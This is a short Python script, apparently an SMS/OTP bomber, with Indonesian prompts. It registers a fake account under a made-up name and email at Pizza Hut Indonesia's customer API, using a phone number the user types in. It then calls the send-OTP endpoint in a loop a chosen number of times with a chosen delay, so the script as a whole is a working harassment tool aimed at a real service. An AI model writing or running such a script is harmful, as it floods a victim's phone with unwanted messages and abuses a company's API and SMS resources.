import requests
import time

nope = input("nomer hp tanpa +62 : ")
jumlah = int(input("Jumlah : "))
delay = int(input("Delay : "))

url = "https://api-prod.pizzahut.co.id/customer/v5/customer/register"
headers = {
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "origin": "https://www.pizzahut.co.id",
    "priority": "u=1, i",
    "referer": "https://www.pizzahut.co.id/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "x-channel": "2",
    "x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
    "x-device-id": "67f88902-ac1c90-21a7-df9ae6",
    "x-device-type": "PC",
    "x-lang": "en",
    "x-platform": "WEBDESKTOP"
}
data = {
    "first_name": "Udin",
    "last_name": "Pettot",
    "phone": nope,
    "email": "udinpetot7080@gmail.com",
    "birthday": "1994-05-14"
}

res = requests.post(url, headers=headers, json=data).json()
if res['code'] == 200:
    key = res['data']['key']

    url = "https://api-prod.pizzahut.co.id/customer/v1/customer/send-otp"
    data = {
        "key": key,
        "type": 1
    }
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.pizzahut.co.id",
        "priority": "u=1, i",
        "referer": "https://www.pizzahut.co.id/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-channel": "2",
        "x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
        "x-device-id": "67f88902-ac1c90-21a7-df9ae6",
        "x-device-type": "PC",
        "x-lang": "en",
        "x-platform": "WEBDESKTOP"
    }

    for i in range(jumlah):
        res = requests.post(url, headers=headers, json=data).json()
        print(f"{res['message']} Sent OTP.")
        time.sleep(delay)
